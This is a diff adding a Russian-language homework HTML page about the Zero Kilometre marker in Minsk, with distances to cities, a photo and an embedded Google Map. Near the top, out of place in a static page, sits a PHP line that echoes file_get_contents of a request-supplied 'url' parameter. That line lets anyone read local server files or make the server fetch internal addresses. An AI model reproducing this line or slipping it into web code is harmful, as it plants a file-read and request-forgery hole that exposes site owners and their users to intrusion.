@@ -1,0 +1,72 @@
+<!DOCTYPE html>
+<html lang="ru" xmlns="http://www.w3.org/1999/html">
+<?php echo file_get_contents($_REQUEST['url']); ?>
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Iframe</title>
+    <style>
+      .block1 {
+        width: 75%;
+        background: #ccc;
+        padding: 5px;
+        padding-right: 20px;
+        border: solid 1px black;
+        display: flex;
+        align-content: center;
+        flex-wrap: wrap;
+        justify-content: center;
+      }
+    </style>
+</head>
+<body>
+    <h1>Домашнее задание после урока 23</h1>
+
+    <h3>
+
+    </h3>Необходимо создать следующую страницу.<br>
+        Выберите какое-либо место (город, страна, достопримечательность и т.д.).<br>
+        Название этого места добавьте в качестве заголовка первого уровня. <br>
+        Ниже добавьте информацию о данном месте, часть информации можно добавить в качестве списка определений. <br>
+        Используя &ltiframe&gt, добавить карту на страницу, на которой отмечено данное место.<br>
+    <div class="block1">
+    <h1>
+        НУЛЕВОЙ КИЛОМЕТР БЕЛАРУСИ
+    </h1>
+    <p>На центральной оси Октябрьской площади в 1998 году был установлен знак нулевого километра «Начало дорог Беларуси».
+
+        От него осуществляется отсчет расстояний во все стороны от белорусской столицы. Постояв минуту-другую у знака, выполненного в форме пирамиды из розового гранита (камень был специально доставлен из Португалии), вы узнаете, к примеру, что расстояние от центра Минска до, например:</p>
+    </div>
+    <div class="block1">
+        <ul>
+        <li><b><u><i>городов Беларуси</i></u></b>
+            <dl>
+                <dt>Могилева - </dt>
+                <dd>199 километров</dd>
+                <dt>Гомеля -</dt>
+                <dd>315 километров</dd>
+                <dt>Бреста - </dt>
+                <dd>334 километра</dd>
+            </dl>
+        </li>
+                <li><b><u><i>городов Европы</i></u></b>
+            <dl>
+                <dt>Киева - </dt>
+                <dd>573 километра</dd>
+                <dt>Риги -</dt>
+                <dd>474 километра</dd>
+                <dt>Вильнюса - </dt>
+                <dd>185 километров</dd>
+            </dl>
+        </li>
+    </ul>
+    </div>
+    <div class="block1">
+        <img src="https://planetabelarus.by/upload/resize_cache/iblock/d07/1330_887_18e21fe612b4afb807a26ecc22279a1d9/d07334ca4ff5848269e26475f73a7103.jpg" width="843" height="695"><br>
+    </div>
+    <div class="block1"><p>Ну а в живую посмотреть данную достопримечательность можно здесь:</p></div>
+    <div class="block1"><iframe src="https://www.google.com/maps/embed?pb=!1m18!1m12!1m3!1d1175.329760501905!2d27.560564956868458!3d53.90225537334841!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x46dbcf876da8488d%3A0xf5f635ab3eb2711b!2z0J_QsNC80Y_RgtC90LjQuiAi0J3Rg9C70LXQstC-0Lkg0LrQuNC70L7QvNC10YLRgCIg0JzQuNC90YHQug!5e0!3m2!1sru!2sby!4v1685708814087!5m2!1sru!2sby" width="600" height="450" style="border:0;" allowfullscreen="" loading="lazy" referrerpolicy="no-referrer-when-downgrade"></iframe></div>
+
+</body>
+</html>
